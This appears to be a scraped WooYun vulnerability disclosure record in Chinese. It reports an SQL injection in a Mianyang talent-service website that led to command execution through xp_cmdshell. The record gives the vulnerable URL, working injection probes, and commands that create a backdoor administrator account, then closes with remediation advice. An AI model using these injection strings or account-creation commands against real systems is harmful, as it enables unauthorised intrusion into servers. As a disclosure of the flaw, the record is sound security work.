{"id": 64961, "wybug_id": "wooyun-2013-020863", "wybug_title": "四川某地市人才网站SQL注射，直接SA、xp_cmdshell拿下服务器", "wybug_corp": "绵阳市人才服务中心", "wybug_author": "叽叽歪歪", "wybug_date": "2013-03-29 11:37", "wybug_open_date": "2013-06-14 10:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["服务权限设置不当", "注射", "权限过高", "服务配置不当", "数据库账户权限过高", "任意命令执行", "数字型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-29：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-06-14：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 由于程序对输入的参数效验不严格 + 数据库配置问题 = 服务器沦陷 详细说明：  在人才资料查询页面http://www.myhm.org/netzp/Readdw.asp?dwcis=1简单手工试了一下，发现存在SQL注入\nhttp://www.myhm.org/netzp/Readdw.asp?dwcis=1'and user=0--\n发现是dbo的(图见:漏洞证明)，再看下数据库\nhttp://www.myhm.org/netzp/Readdw.asp?dwcis=1' and db_name(1)=0http://www.myhm.org/netzp/Readdw.asp?dwcis=1' and db_name(2)=0http://www.myhm.org/netzp/Readdw.asp?dwcis=1' and db_name(3)=0......\n太麻烦了，NBSI工具上场……\n\n开的端口不多，多试试了几下，发现3072就是我们找的3389。下一步net user xxx xxx /addnet localgroup administrators xxx /add然后，然后就没有然后了。   漏洞证明：  先看dbo的图\n\n再看看NBSI的操作情况\n\n   修复方案：  1、对输入的是数字参数，做类型判断2、对输入是字符串参数，采用“参数型”方式查询数据库3、数据库的权限要做认真配置呀，不必要的组件就别开了   版权声明：转载请注明来源 叽叽歪歪@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：14 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 14, "Ranks": null}